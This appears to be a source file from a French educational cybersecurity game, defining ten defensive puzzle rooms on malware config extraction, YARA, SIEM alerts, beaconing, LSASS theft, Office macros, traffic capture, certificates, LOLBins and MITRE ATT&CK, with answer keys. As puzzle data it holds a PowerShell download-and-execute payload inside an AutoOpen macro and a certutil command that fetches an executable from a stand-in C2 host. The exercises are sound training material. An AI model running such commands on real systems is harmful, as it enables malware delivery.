import { toBase64, toXorHex } from "@/lib/crypto";
import type { RoomContent } from "@/lib/types";

const MALWARE_CONFIG = toBase64(toXorHex('{"c2":"meteo-sync.net","port":8443,"id":"BOT-7731","cle":"ouragan"}', "soc"));
const MACRO_PAYLOAD = toBase64("iex (New-Object Net.WebClient).DownloadString('http://facture-pdf.top/a.ps1')");

/** Salles 11 à 20 du niveau Très difficile. */
export const TRES_DIFFICILE_2: RoomContent[] = [
  {
    id: "tres-difficile-11",
    name: "La configuration du malware",
    story:
      "Dans un échantillon du malware du pirate, un bloc de données est chiffré. Un analyste a trouvé la routine : Base64, puis XOR avec la clé « soc ».",
    card: {
      title: "La configuration d'un malware",
      category: "Défense",
      icon: "🦠",
      summary: "Les malwares cachent leurs paramètres (serveur C2, identifiant, clés) dans un bloc chiffré.",
      details: [
        "La configuration indique au malware où se connecter et comment se comporter.",
        "Elle est souvent protégée par un encodage et un XOR simple, pour échapper aux analyses automatiques.",
        "L'extraire donne des indicateurs de compromission (IOC) : domaines, IP, identifiants à bloquer partout.",
      ],
      hint: "Base64 → texte, puis XOR (hex) avec la clé soc. Le résultat est du JSON.",
    },
    puzzle: {
      kind: "answer",
      content: MALWARE_CONFIG,
      tools: ["base64", "xor", "hex", "reverse"],
      workshopInput: MALWARE_CONFIG,
      question: "Quel est le domaine du serveur C2 ?",
      answers: ["meteo-sync.net"],
      placeholder: "exemple.com",
    },
    successText: "Configuration extraite. Le domaine C2 est bloqué sur tout le réseau.",
  },
  {
    id: "tres-difficile-12",
    name: "La règle de chasse",
    story: "L'équipe a écrit une règle YARA pour détecter le malware. Trois fichiers suspects ont été analysés. Lequel déclenche la règle ?",
    card: {
      title: "Les règles YARA",
      category: "Défense",
      icon: "🎯",
      summary: "Des signatures sur mesure pour reconnaître une famille de malwares à partir de ses caractéristiques.",
      details: [
        "Une règle YARA décrit des chaînes de texte ou d'octets à rechercher, et une condition.",
        "« 2 of them » veut dire : au moins deux des chaînes listées doivent être présentes.",
        "Les analystes l'utilisent pour chasser une menace sur des milliers de fichiers d'un coup.",
      ],
      hint: "La condition exige au moins 2 des 3 chaînes. Compte pour chaque fichier.",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "regle.yar + chaînes trouvées dans chaque fichier",
      content: `rule Pirate_Loader {
  strings:
    $a = "meteo-sync.net"
    $b = "BOT-"
    $c = "ouragan"
  condition:
    2 of them
}

facture.exe   → "BOT-", "Bonjour"
outil.dll     → "meteo-sync.net", "ouragan", "kernel32"
photo.scr     → "ouragan"`,
      question: "Quel fichier est détecté par la règle ?",
      answers: ["outil.dll"],
    },
    successText: "outil.dll détecté et mis en quarantaine.",
  },
  {
    id: "tres-difficile-13",
    name: "La requête du SIEM",
    story: "Tu dois créer une alerte dans le SIEM pour repérer les attaques par force brute. Quatre requêtes ont été proposées.",
    card: {
      title: "Le SIEM",
      category: "Défense",
      icon: "🗄️",
      summary: "Il centralise les journaux de toute l'entreprise pour les rechercher, les corréler et déclencher des alertes.",
      details: [
        "SIEM = Security Information and Event Management : le cerveau d'un SOC.",
        "Il reçoit les logs des serveurs, postes, pare-feu, EDR… et les rend interrogeables.",
        "Une règle de détection combine un filtre, un regroupement et un seuil (ex. plus de 10 échecs en 5 minutes).",
      ],
      hint: "Force brute = beaucoup d'échecs de connexion (4625), depuis la même source, en peu de temps.",
    },
    puzzle: {
      kind: "choice",
      question: "Quelle requête détecte une attaque par force brute ?",
      options: [
        { label: "EventID=4624 | count by user", correct: false, explanation: "4624 compte les connexions réussies, sans seuil ni regroupement par source." },
        { label: "EventID=4625 | count by src_ip | where count > 10 within 5m", correct: true, explanation: "Beaucoup d'échecs depuis une même IP en peu de temps : c'est la signature de la force brute." },
        { label: "EventID=4720 | table user", correct: false, explanation: "4720 liste les créations de comptes." },
        { label: "EventID=4625 | head 1", correct: false, explanation: "Un seul échec ne prouve rien : tout le monde se trompe parfois." },
      ],
    },
    successText: "Alerte en place. La prochaine force brute sera repérée en moins de 5 minutes.",
  },
  {
    id: "tres-difficile-14",
    name: "Le battement de cœur",
    story: "Le proxy a enregistré le trafic d'un poste infecté. Le malware contacte son serveur à intervalle parfaitement régulier, comme un battement de cœur.",
    card: {
      title: "Le beaconing",
      category: "Réseau",
      icon: "💓",
      summary: "Un malware qui « appelle la maison » à intervalles réguliers pour recevoir des ordres.",
      details: [
        "Les implants contactent leur serveur C2 toutes les X secondes pour demander des instructions.",
        "Cette régularité, inhabituelle pour un humain, est un excellent indicateur de détection.",
        "Les attaquants ajoutent parfois du « jitter » (un peu d'aléatoire) pour se cacher.",
      ],
      hint: "Cherche le domaine contacté exactement toutes les 60 secondes.",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "proxy.log (poste 10.0.0.37)",
      content: `09:00:00  GET https://cdn.actu-sport.fr/img/1.jpg
09:00:12  GET https://update-cdn.kesto.io/ping
09:00:41  GET https://www.serveur-corp.fr/intranet
09:01:12  GET https://update-cdn.kesto.io/ping
09:01:58  GET https://cdn.actu-sport.fr/video.mp4
09:02:12  GET https://update-cdn.kesto.io/ping
09:03:12  GET https://update-cdn.kesto.io/ping`,
      question: "Quel domaine est le serveur C2 du malware ?",
      answers: ["update-cdn.kesto.io"],
      placeholder: "exemple.com",
    },
    successText: "Le battement est stoppé : domaine bloqué, poste isolé.",
  },
  {
    id: "tres-difficile-15",
    name: "Le voleur de mémoire",
    story: "L'EDR a enregistré des accès au processus lsass.exe, qui garde en mémoire les identifiants des utilisateurs connectés. Un seul accès est malveillant.",
    card: {
      title: "Le vol d'identifiants en mémoire",
      category: "Système",
      icon: "🧠",
      summary: "Lire la mémoire du processus LSASS pour récupérer mots de passe et hashs.",
      details: [
        "Sous Windows, lsass.exe gère l'authentification et garde des secrets en mémoire.",
        "Des outils comme Mimikatz (ou un « dump » mémoire) permettent de les extraire.",
        "Un accès à LSASS par un programme inhabituel est une alerte critique pour un SOC.",
      ],
      hint: "Certains processus système accèdent légitimement à LSASS. Cherche celui qui n'a rien à faire là.",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "EDR – accès au processus lsass.exe",
      content: `Heure     Processus source                      Accès
10:02:11  C:\\Windows\\System32\\svchost.exe        lecture limitée
10:05:47  C:\\Windows\\System32\\wininit.exe        lecture limitée
10:17:03  C:\\Users\\Public\\maj_audio.exe          lecture COMPLÈTE de la mémoire
10:20:30  C:\\Program Files\\EDR\\agent.exe         lecture limitée`,
      question: "Quel programme a volé les identifiants ?",
      answers: ["maj_audio.exe", "C:\\Users\\Public\\maj_audio.exe"],
    },
    successText: "maj_audio.exe isolé. Tous les mots de passe des comptes connectés sont réinitialisés.",
  },
  {
    id: "tres-difficile-16",
    name: "La facture piégée",
    story: "Un document Word « Facture_novembre.docm » demande d'« activer le contenu ». Tu ouvres sa macro dans un environnement d'analyse.",
    card: {
      title: "Les macros malveillantes",
      category: "Système",
      icon: "📄",
      summary: "Du code caché dans un document Office, qui s'exécute quand on clique sur « Activer le contenu ».",
      details: [
        "Les fichiers .docm, .xlsm contiennent des macros VBA, capables de lancer des programmes.",
        "AutoOpen ou Document_Open s'exécutent automatiquement à l'ouverture.",
        "Elles téléchargent souvent un second programme malveillant via PowerShell.",
      ],
      hint: "La partie après -enc est du Base64. Décode-la et cherche l'adresse contactée.",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "macro VBA",
      content: `Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -w hidden -enc ${MACRO_PAYLOAD}"
    CreateObject("WScript.Shell").Run cmd, 0
End Sub`,
      tools: ["base64", "hex", "url"],
      workshopInput: MACRO_PAYLOAD,
      question: "Depuis quel domaine la macro télécharge-t-elle son script ?",
      answers: ["facture-pdf.top"],
      placeholder: "exemple.com",
    },
    successText: "Domaine bloqué, macros désactivées par défaut sur tous les postes.",
  },
  {
    id: "tres-difficile-17",
    name: "La capture réseau",
    story: "Tu as enregistré le trafic d'une page de connexion du pirate. Il a oublié HTTPS : tout passe en clair.",
    card: {
      title: "L'analyse de trafic",
      category: "Réseau",
      icon: "🦈",
      summary: "Capturer et lire les paquets qui circulent sur un réseau, avec des outils comme Wireshark.",
      details: [
        "Une capture (fichier .pcap) contient le détail de chaque échange réseau.",
        "Sans chiffrement (HTTP, FTP, Telnet), les identifiants se lisent directement.",
        "C'est pour ça que HTTPS est indispensable, partout, et pas seulement sur les pages de paiement.",
      ],
      hint: "Cherche la requête POST vers /login et décode son contenu.",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "tshark -r capture.pcap",
      content: `1  10.0.0.37 → 198.51.100.66  HTTP  GET /login HTTP/1.1
2  198.51.100.66 → 10.0.0.37  HTTP  200 OK (text/html)
3  10.0.0.37 → 198.51.100.66  HTTP  POST /login HTTP/1.1
      Authorization: Basic YWRtaW46UHJpbnRlbXBzITI0
4  198.51.100.66 → 10.0.0.37  HTTP  302 Found → /panel`,
      tools: ["base64", "url"],
      workshopInput: "",
      question: "Quel mot de passe a été capturé ?",
      answers: ["Printemps!24"],
      strict: true,
    },
    successText: "Mot de passe capturé. HTTPS, ce n'est vraiment pas une option.",
  },
  {
    id: "tres-difficile-18",
    name: "Le certificat douteux",
    story: "Le navigateur refuse le certificat du serveur du pirate. Tu en examines les détails : il y a plusieurs problèmes.",
    card: {
      title: "Les certificats TLS",
      category: "Crypto",
      icon: "📜",
      summary: "La carte d'identité d'un site : elle prouve que tu parles bien au bon serveur.",
      details: [
        "Un certificat est signé par une autorité de certification reconnue par ton navigateur.",
        "Il est valide pour un nom de domaine précis et pour une durée limitée.",
        "Auto-signé, expiré ou émis pour un autre domaine : le navigateur affiche une alerte.",
      ],
      hint: "Vérifie trois choses : qui l'a signé, pour quel domaine, et jusqu'à quand.",
    },
    puzzle: {
      kind: "multi",
      contentLabel: "certificat de https://banque-horizon-securite.com",
      content: `Émis pour (CN)  : www.autre-site.org
Émis par        : www.autre-site.org (auto-signé)
Valide du       : 01/01/2025
Valide jusqu'au : 01/03/2026
Algorithme      : RSA 2048 / SHA-256`,
      question: "Quels problèmes ce certificat présente-t-il ? (nous sommes en novembre 2026)",
      options: [
        { label: "Il est émis pour un autre domaine", correct: true, explanation: "Le CN ne correspond pas au site visité." },
        { label: "Il est auto-signé", correct: true, explanation: "Aucune autorité reconnue ne garantit l'identité du site." },
        { label: "Il a expiré", correct: true, explanation: "Sa validité s'est terminée en mars 2026." },
        { label: "Il utilise RSA 2048 / SHA-256", correct: false, explanation: "Ces algorithmes sont encore considérés comme corrects." },
      ],
    },
    successText: "Trois problèmes sur trois. Ce certificat ne prouvait rien.",
  },
  {
    id: "tres-difficile-19",
    name: "L'outil détourné",
    story: "Aucun programme inconnu n'a été lancé. Pourtant, un fichier malveillant a été téléchargé. Le pirate a utilisé un outil fourni avec Windows.",
    card: {
      title: "Les LOLBins",
      category: "Système",
      icon: "🧰",
      summary: "Détourner des outils légitimes du système pour attaquer sans installer de programme suspect.",
      details: [
        "« Living off the land » : utiliser ce qui est déjà présent (certutil, powershell, mshta, rundll32…).",
        "Ces outils sont signés par Microsoft, donc moins suspects pour un antivirus.",
        "Le projet LOLBAS recense ces usages détournés ; les SOC surveillent leurs lignes de commande.",
      ],
      hint: "Quel outil, normalement prévu pour gérer des certificats, télécharge ici un fichier depuis Internet ?",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "ligne de commande enregistrée par l'EDR",
      content: `certutil.exe -urlcache -split -f http://meteo-sync.net/svc.exe C:\\Users\\Public\\svc.exe`,
      question: "Quel outil Windows a été détourné ?",
      answers: ["certutil", "certutil.exe"],
    },
    successText: "Détournement de certutil repéré. Une règle de détection est ajoutée.",
  },
  {
    id: "tres-difficile-20",
    name: "La matrice",
    story: "Dernière salle du niveau. Pour ton rapport, chaque action du pirate doit être classée selon la matrice utilisée par tous les SOC du monde.",
    card: {
      title: "MITRE ATT&CK",
      category: "Défense",
      icon: "🗺️",
      summary: "Une base mondiale qui classe les tactiques et techniques des attaquants.",
      details: [
        "Les tactiques sont les objectifs (accès initial, persistance, exfiltration…), les techniques sont les moyens.",
        "Chaque technique a un identifiant, par exemple T1136 pour la création de compte.",
        "Elle donne un langage commun aux analystes, aux outils et aux rapports.",
      ],
      hint: "Créer un compte pour pouvoir revenir plus tard : quel est l'objectif de l'attaquant ?",
    },
    puzzle: {
      kind: "choice",
      question: "Le pirate a créé le compte svc-backup pour revenir plus tard. Quelle tactique ATT&CK ?",
      options: [
        { label: "Exfiltration", correct: false, explanation: "L'exfiltration consiste à sortir des données." },
        { label: "Persistence (persistance)", correct: true, explanation: "Garder un accès dans la durée : c'est la persistance (technique T1136)." },
        { label: "Discovery (découverte)", correct: false, explanation: "La découverte consiste à explorer le système." },
        { label: "Impact", correct: false, explanation: "L'impact vise à détruire ou perturber (ex. rançongiciel)." },
      ],
    },
    successText: "Rapport classé selon ATT&CK. Niveau très difficile entièrement terminé !",
  },
];
